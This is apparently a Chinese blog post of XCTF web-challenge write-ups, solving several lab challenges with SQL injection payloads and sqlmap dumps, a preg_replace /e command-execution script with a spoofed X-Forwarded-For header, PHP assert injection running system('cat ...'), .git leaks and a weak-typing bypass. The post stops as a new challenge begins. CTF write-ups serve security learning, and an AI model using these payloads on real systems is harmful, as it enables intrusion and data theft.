<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    <title>XCTF攻防世界 WEB 高手区（一） | 吴家兴的博客</title>
    
    
        <meta property="og:site_name" content="吴家兴的博客">
    
    
        <meta property="article:author" content="WuJiaxing">
    
    
        <link rel="icon" href="/img/favicon.ico">
    
    
<link rel="stylesheet" href="/css/minireset.min.css">

    
<link rel="stylesheet" href="/css/all.min.css">

    
<link rel="stylesheet" href="/css/csshake.min.css">

    
<link rel="stylesheet" href="/css/hljs/lioshi.css">

    
<link rel="stylesheet" href="/css/jquery.fancybox.min.css">

    
<link rel="stylesheet" href="/styl/main.css">

    
<script src="/js/jquery.min.js"></script>

    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/jquery.fancybox.min.js"></script>

    
<script src="/js/clipboard.min.js"></script>

    
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <header>
  <div class="outer">
    <div class="inner">
      <h1 class="logo-wrap">
        <a>吴家兴的博客<b><sup>1.2</sup></b></a>
      </h1>
    </div>
    <div class="inner">
      <nav class="main-nav">
        
          
            <a href="/">首页</a>
          
        
          
            <a href="/archives">归档</a>
          
        
          
            <a href="/categories">分类</a>
          
        
          
            <a href="/tags">标签</a>
          
        
          
            <a href="/friends">友链</a>
          
        
          
            <a href="/about">关于</a>
          
        
          
            <div class="dropdown">
              <a class="dropbtn">个人项目</a>
              <div class="dropdown-content">
                
                  <a href="http://prowiki.wujiaxing.cn/" target="_blank" rel="noopener">Hexo主题</a>
                
                  <a href="https://readflag.cn/" target="_blank" rel="noopener">CTF在线工具</a>
                
                  <a href="https://search.readflag.cn/" target="_blank" rel="noopener">CTF题目搜索</a>
                
                  <a href="https://xn--tsta5434bba.xn--fiqs8s/" target="_blank" rel="noopener">短链接</a>
                
              </div>
            </div>
          
        
          
            <div class="dropdown">
              <a class="dropbtn">搭建示例</a>
              <div class="dropdown-content">
                
                  <a href="https://nes.wujiaxing.cn/" target="_blank" rel="noopener">NES游戏机</a>
                
                  <a href="https://fupin.wujiaxing.cn/" target="_blank" rel="noopener">支付宝当面付</a>
                
              </div>
            </div>
          
        
      </nav>
    </div>
  </div>
</header>
    <div class="content">
        <section class="outer">
    <article>
        <div class="article-title">
    <h2>
        <a href="/2019/11/04/a940d9d0/" class="shake shake-little" title="XCTF攻防世界 WEB 高手区（一）">
            
            XCTF攻防世界 WEB 高手区（一）
        </a>
    </h2>
    <div class="meta_box">
    
        
        
            
                
        
        <div class="meta meta_auth">
            <img src="/img/default.png" alt="head" />
            <p>anonymous</p>
        </div>
    
        
            <div class="meta meta_cate">
                <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
                <p><a class="article-category-link" href="/categories/writeup/">writeup</a></p>
            </div>
        
        
        <div class="meta meta_date">
            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
            <p>发布于：2019年11月04日</p>
        </div>
    
        <div class="meta meta_update">
            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
            <p>更新于：2021年05月25日</p>
        </div>
    </div>
    
  <div class="post_tags">
    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XCTF/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>XCTF</a></li></ul>
  </div>


</div>

        <hr>
        <div class="article-entry">
            
            
            
            <p>只记录做题步骤</p>
<a id="more"></a>

<h2 id="0x001-Cat"><a href="#0x001-Cat" class="headerlink" title="0x001 Cat"></a>0x001 Cat</h2><p>输入“baidu.com”没有返回，输入“127.0.0.1”返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.<br>64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.068 ms<br><br>--- 127.0.0.1 ping statistics ---<br>1 packets transmitted, 1 received, 0% packet loss, time 0ms<br>rtt min&#x2F;avg&#x2F;max&#x2F;mdev &#x3D; 0.068&#x2F;0.068&#x2F;0.068&#x2F;0.000 ms<br></code></pre></td></tr></table></figure>
<p>所以本题后台用的是ping命令，如果输入包含空格时会返回错误信息“Invalid URL”。</p>
<p>测试命令拼接，试着用“%a0”替换请求的url中空格，返回了一个报错信息的html，保存为html文件后打开发现是“django”的报错页面，所以后台应该同时运行了django服务。</p>
<p>php将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。</p>
<p>在报错信息中“Settings-DATABASES”显示了sqlites数据库的路径为“/opt/api/database.sqlite3”（django默认使用的的是sqlites数据库）；在“Request information”中可以看到index.php的源码；“django”项目的根路径是“/opt/api”。</p>
<p>接下来利用“php”的<a href="https://www.php.net/manual/zh/function.curl-setopt.php" target="_blank" rel="noopener">CURLOPT_POSTFIELDS</a>，通过“@+文件路径”的方式查看文件内容。</p>
<p>访问“ip:port/index.php?url=@/opt/api/database.sqlite3”,在返回结果中搜索“ctf”就能找到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">WHCTF&#123;yoooo_Such_A_G00D_@&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x002-ics-04"><a href="#0x002-ics-04" class="headerlink" title="0x002 ics-04"></a>0x002 ics-04</h2><p>查看网页源码，只有注册、登录会跳转(题目描述也提示了)。注册后登录，提示“普通用户登录成功,没什么用”，登录页还有一个忘记密码。页面写着“cetc”用户找回密码，经测试用户名输入框可以注入，第三列会回显在网页上。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">a<span class="hljs-string">' union select 1,2,3,4#</span><br><span class="hljs-string"></span><br><span class="hljs-string">取库名</span><br><span class="hljs-string">a'</span> union select 1,2,( select group_concat(schema_name) from information_schema.schemata ),4<span class="hljs-comment">#</span><br>返回：information_schema,cetc004,mysql,performance_schema<br><br>取表名<br>a<span class="hljs-string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='</span>cetc004<span class="hljs-string">'),4#</span><br><span class="hljs-string">返回：user</span><br><span class="hljs-string"></span><br><span class="hljs-string">取列名</span><br><span class="hljs-string">a'</span> union select 1,2,( select group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">'user'</span>),4<span class="hljs-comment">#</span><br>返回：username,password,question,answer,Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view<br><br>取所有用户名<br>a<span class="hljs-string">' union select 1,2,( select group_concat(username) from cetc004.user),4#</span><br><span class="hljs-string">返回：c3tlwDmIn23</span><br><span class="hljs-string"></span><br><span class="hljs-string">取密码</span><br><span class="hljs-string">a'</span> union select 1,2,( select CONCAT_WS(<span class="hljs-string">','</span>,`password`,question,answer) from cetc004.user <span class="hljs-built_in">where</span> username=<span class="hljs-string">'c3tlwDmIn23'</span>),4<span class="hljs-comment">#</span><br>返回：2f8667f381ff50ced6a3edc259260ba9,cetc,cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds<br></code></pre></td></tr></table></figure>
<p>可以解md5得到密码“1qazWSXED56yhn8ujm9olk81wdfTG”后登陆得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;0228baceaa16d6f0609074ef6c8e51ed&#125;<br></code></pre></td></tr></table></figure>
<p>此题也可以使用sqlmap直接跑“findpwd.php”，注入参数是“username”，得到表中数据。</p>
<p>发现此题的注册可以重复注册（相同用户名可以重复注册），重复注册的密码都能登陆成功，如果密码的hash解不出时可以用“c3tlwDmIn23”注册一次，再用新注册的密码登录即可。</p>
<h2 id="0x003-ics-05"><a href="#0x003-ics-05" class="headerlink" title="0x003 ics-05"></a>0x003 ics-05</h2><p>查看网页源码，只有“设备维护中心”菜单会跳转，跳转到“index.php”。在“index.php”中点击“云平台设备维护中心”会在url中添加“page”参数。利用php伪协议访问“ip:port/index.php?page=php://filter/convert.base64-encode/resource=index.php”，base64解密后得到index.php源码，其中有后门代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;<br><br>    $pattern = $_GET[pat];<br>    $replacement = $_GET[rep];<br>    $subject = $_GET[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($pattern) &amp;&amp; <span class="hljs-keyword">isset</span>($replacement) &amp;&amp; <span class="hljs-keyword">isset</span>($subject)) &#123;<br>        preg_replace($pattern, $replacement, $subject);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>PHP的<a href="https://www.php.net/preg_replace" target="_blank" rel="noopener">preg_replace()函数</a>存在一个安全问题（<a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval" target="_blank" rel="noopener">官方说明</a>）：</p>
<blockquote>
<p>如果设置了这个被弃用的修饰符， preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线()和 NULL 字符在 后向引用替换时会被用反斜线转义.<br>注意：请确保 replacement 参数由合法 php 代码字符串组成，否则 php 将会 在preg_replace() 调用的行上产生一个解释错误。</p>
</blockquote>
<p>翻译成通俗的话就是preg_replace()函数的第一个参数加上/e后会把替换后的字符串（相当于）放到eval()函数中当做命令执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>print(requests.get(<span class="hljs-string">'http://ip:port/index.php?pat=/xxx/e&amp;sub=xxx&amp;rep=system("ls")'</span>,headers=&#123;<br>    <span class="hljs-string">"X-Forwarded-For"</span>:<span class="hljs-string">"127.0.0.1"</span><br>&#125;).content.decode(<span class="hljs-string">"utf-8"</span>))<br></code></pre></td></tr></table></figure>

<p>通过改变rep参数依次执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网站根目录下问价</span><br>system(<span class="hljs-string">"ls"</span>)<br><br><span class="hljs-comment"># 查看目录下内容，返回“flag”</span><br>system(<span class="hljs-string">"ls s3chahahaDir"</span>)<br><br><span class="hljs-comment"># 查看目录下内容，返回“flag.php”</span><br>system(<span class="hljs-string">"ls s3chahahaDir/flag"</span>)<br><br><span class="hljs-comment"># 查看文件内容</span><br>system(<span class="hljs-string">"cat s3chahahaDir/flag/flag.php"</span>)<br></code></pre></td></tr></table></figure>
<p>flag.php内容包含flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;69f7c449b13b1037c493d6608afd9697&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x004-ics-06"><a href="#0x004-ics-06" class="headerlink" title="0x004 ics-06"></a>0x004 ics-06</h2><p>查看网页源码，“报表中心”菜单链接到“index.php”，打开后有一个参数“id=1”但是没有显示内容（只有“送分题”）。用“burpsuite”或python代码爆破参数id，得到当id=2333时返回内容的长度是不同的，打开“ip:port/index.php?id=2333”即返回flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;b82d0fe5e6cdf69f9b83d0e2d1e1277e&#125;<br></code></pre></td></tr></table></figure>
<p>工具：<a href="https://www.52pojie.cn/thread-787224-1-1.html" target="_blank" rel="noopener">burpsuite</a></p>
<h2 id="0x005-lottery"><a href="#0x005-lottery" class="headerlink" title="0x005 lottery"></a>0x005 lottery</h2><p>打开是一个模拟彩票界面，用“dirsearch”扫描到.git目录，使用“GitHack”可以得到网站的源码，下面是api.php中判断中奖金额的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span><span class="hljs-params">($req)</span></span>&#123;<br>	require_registered();<br>	require_min_money(<span class="hljs-number">2</span>);<br><br>	$money = $_SESSION[<span class="hljs-string">'money'</span>];<br>	$numbers = $req[<span class="hljs-string">'numbers'</span>];<br>	$win_numbers = random_win_nums();<br>	$same_count = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;<br>		<span class="hljs-keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;<br>			$same_count++;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">switch</span> ($same_count) &#123;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>			$prize = <span class="hljs-number">5</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>			$prize = <span class="hljs-number">20</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>			$prize = <span class="hljs-number">300</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>			$prize = <span class="hljs-number">1800</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>			$prize = <span class="hljs-number">200000</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>			$prize = <span class="hljs-number">5000000</span>;<br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">default</span>:<br>			$prize = <span class="hljs-number">0</span>;<br>			<span class="hljs-keyword">break</span>;<br>	&#125;<br>	$money += $prize - <span class="hljs-number">2</span>;<br>	$_SESSION[<span class="hljs-string">'money'</span>] = $money;<br>	response([<span class="hljs-string">'status'</span>=&gt;<span class="hljs-string">'ok'</span>,<span class="hljs-string">'numbers'</span>=&gt;$numbers, <span class="hljs-string">'win_numbers'</span>=&gt;$win_numbers, <span class="hljs-string">'money'</span>=&gt;$money, <span class="hljs-string">'prize'</span>=&gt;$prize]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>numbers参数可以通过数组绕过，利用php的弱类型比较，当numbers=[true,true,true,true,true,true,true]时，“$numbers[$i] == $win_numbers[$i]”的判断就会变成“true==’1’”的形式，这个判断是恒为真的（只有中奖号码为0时为假），就可以每提交一次账户余额增加5000000（如果中奖号码包含0就增加的少），运气好的话提交两次就能“购买”flag。使用“burpsuite”拦截并修改numbers，重复提交几次后刷新网页购买得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;729202c488bf217fadbe93a7ac8c02b4&#125;<br></code></pre></td></tr></table></figure>
<p>工具：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>、<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p>
<h2 id="0x006-NewsCenter"><a href="#0x006-NewsCenter" class="headerlink" title="0x006 NewsCenter"></a>0x006 NewsCenter</h2><p>只有一个搜索框，输入“hello”可以进行搜索，返回的信息包含标题和内容，输入“&#39;union select 1,2,3#”发现可以注入。本题没有任何过滤比较基础，使用各种方法都可以得到flag。</p>
<p>方法一、使用sqlmap按步骤查询</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询数据库名</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> --dbs<br><span class="hljs-comment"># 返回信息</span><br>[13:05:30] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Debian 9.0 (stretch)<br>web application technology: Apache 2.4.25<br>back-end DBMS: MySQL 5<br>[13:05:30] [INFO] fetching database names<br>available databases [2]:<br>[*] information_schema<br>[*] news<br><br><span class="hljs-comment"># 查询“news”库表名</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> -D news --tables<br><span class="hljs-comment"># 返回信息</span><br>Database: news<br>[2 tables]<br>+--------------+<br>| news         |<br>| secret_table |<br>+--------------+<br><br><span class="hljs-comment"># 查询“news”库“secret_table”表列名</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> -D news -T secret_table --columns<br><span class="hljs-comment"># 返回信息</span><br>Database: news<br>Table: secret_table<br>[2 columns]<br>+--------+------------------+<br>| Column | Type             |<br>+--------+------------------+<br>| fl4g   | varchar(50)      |<br>| id     | int(10) unsigned |<br>+--------+------------------+<br><br><span class="hljs-comment"># 查询“news”库“secret_table”表内容</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> -D news -T secret_table --dump<br><span class="hljs-comment"># 返回信息</span><br>Database: news<br>Table: secret_table<br>[1 entry]<br>+----+--------------------------+<br>| id | fl4g                     |<br>+----+--------------------------+<br>| 1  | QCTF&#123;sq1_inJec7ion_ezzz&#125; |<br>+----+--------------------------+<br><br><span class="hljs-comment"># 或者也可以直接爆所有数据</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> --dump<br></code></pre></td></tr></table></figure>

<p>方法二、使用sqlmap连接sqlshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用burpsuite导出搜索请求到文件req.txt(手动填写也可以)</span><br>sqlmap.py -r req.txt --batch --sql-shell<br><span class="hljs-comment"># 关键内容如下</span><br><span class="hljs-string">'</span><br><span class="hljs-string">POST / HTTP/1.1</span><br><span class="hljs-string">Host: ip:port</span><br><span class="hljs-string"></span><br><span class="hljs-string">search=1</span><br><span class="hljs-string">'</span><br><br><span class="hljs-comment"># 或者url直连</span><br>sqlmap -u <span class="hljs-string">"http://ip:port/"</span> --data <span class="hljs-string">"search=1"</span> --batch --sql-shell<br><br><span class="hljs-comment"># 连上sqlshell后</span><br>select table_name from information_schema.columns;<br>select * from secret_table;<br></code></pre></td></tr></table></figure>

<p>方法三、手动注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 查询所有库名和表名<br>&#39; and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #<br><br># 查询列名和数据类型<br>&#39; and 0 union select 1,COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME&#x3D;&#39;secret_table&#39; #<br><br># 查询表内容<br>&#39; and 0 union select 1,id,fl4g from secret_table #<br></code></pre></td></tr></table></figure>

<p>最后flag就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">QCTF&#123;sq1_inJec7ion_ezzz&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x007-mfw"><a href="#0x007-mfw" class="headerlink" title="0x007 mfw"></a>0x007 mfw</h2><p>about页面提示用了git，访问“ip:port/.git/”发现存在.git泄露，使用“GitHack”获取到网页源码。发现templates目录下存在“flag.php”，而网站中的各个菜单内容是index.php通过page参数包含进来的，审计index.php关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>])) &#123;<br>	$page = $_GET[<span class="hljs-string">'page'</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	$page = <span class="hljs-string">"home"</span>;<br>&#125;<br><br>$file = <span class="hljs-string">"templates/"</span> . $page . <span class="hljs-string">".php"</span>;<br><br><span class="hljs-comment">// I heard '..' is dangerous!</span><br>assert(<span class="hljs-string">"strpos('$file', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br>assert(<span class="hljs-string">"file_exists('$file')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里有两个比较关键的函数</p>
<ol>
<li><a href="https://www.php.net/strpos" target="_blank" rel="noopener">strpos</a>：查找字符串首次出现的位置，并返回首次出现的数字位置（从0开始），如果没找到将返回 FALSE。</li>
<li><a href="https://www.php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">assert</a>：检查一个断言是否为 FALSE，并在结果为 FALSE 时采取适当的行动。<b>参数字符串将会被当做PHP代码来执行</b>。</li>
</ol>
<p>page参数没有经过任何过滤和处理，直接拼接字符串得到$file，而assert的参数又是字符串拼接的，所以可以通过构造字符串闭合strpos函数(报错会没有返回信息)，利用assert执行命令。下面分析一种闭合情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">当page&#x3D;&#39;.system(&quot;cat templates&#x2F;flag.php&quot;).&#39;时，<br><br>$file&#x3D;&quot;templates&#x2F;&#39;.system(&quot;cat templates&#x2F;flag.php&quot;).&#39;.php&quot;<br><br>assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;)<br>&#x3D;&gt; assert(&quot;strpos(&#39;templates&#x2F;&#39;.system(&quot;cat templates&#x2F;flag.php&quot;).&#39;.php&#39;, &#39;..&#39;)<br><br>其中“.”是连接字符串，中间连接的是执行system(&quot;cat templates&#x2F;flag.php&quot;)后的结果，<br>相当于文件名变成了“templates&#x2F;cat输出.php”，<br>因为flag.php内容不包含“..”，所以第一个assert可以通过，同时输出了一次flag.php的内容<br>由于文件名发生了改变，改变后的文件不存在，<br>所以第二个assert执行时会被拦截，返回“That file doesn&#39;t exist!”，在这之前又输出了一次flag.php的内容<br></code></pre></td></tr></table></figure>

<p>访问“ip:port/?page=&#39;.system(&quot;cat templates/flag.php&quot;).&#39;”就能得到返回值，<br>或者类似的执行print_r(file_get_contents(&quot;templates/flag.php&quot;)，<br>或者用git命令比较文件变化system(&quot;git diff&quot;)，<br>同理page=&#39;.phpinfo().&#39;会返回phpinfo()的网页。</p>
<p>如果“page=&#39;).system(&quot;cat templates/flag.php&quot;);//”,<br>可以在输出flag.php的同时绕过两个assert返回index.php页面。</p>
<p>不过由于php源码中的“&lt;&gt;”，需要查看网页源码才能看到flag，最后flag是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;10ea848fc1fd6a4b58fe504aa50c8698&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x008-Training-WWW-Robots"><a href="#0x008-Training-WWW-Robots" class="headerlink" title="0x008 Training-WWW-Robots"></a>0x008 Training-WWW-Robots</h2><p>题目提示“robots.txt”，访问后发现“/fl0g.php”，再次访问“/fl0g.php”得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cyberpeace&#123;036ebe1c19b8a0a88cc985d7e55b0014&#125;<br></code></pre></td></tr></table></figure>

<h2 id="0x009-NaNNaNNaNNaN-Batman"><a href="#0x009-NaNNaNNaNNaN-Batman" class="headerlink" title="0x009 NaNNaNNaNNaN-Batman"></a>0x009 NaNNaNNaNNaN-Batman</h2><p>附件解压得到一个文件，文本编辑器打开发现是有点乱码的javascript，包含大量的控制字符。在js最后发现eval函数，执行了前面的_函数。去掉头尾的script标签，把eval改为console.log，然后全部粘贴到浏览器的console中执行（后面的for循环替换了控制字符），结果输出了javascript的源码，格式化后如下</p>
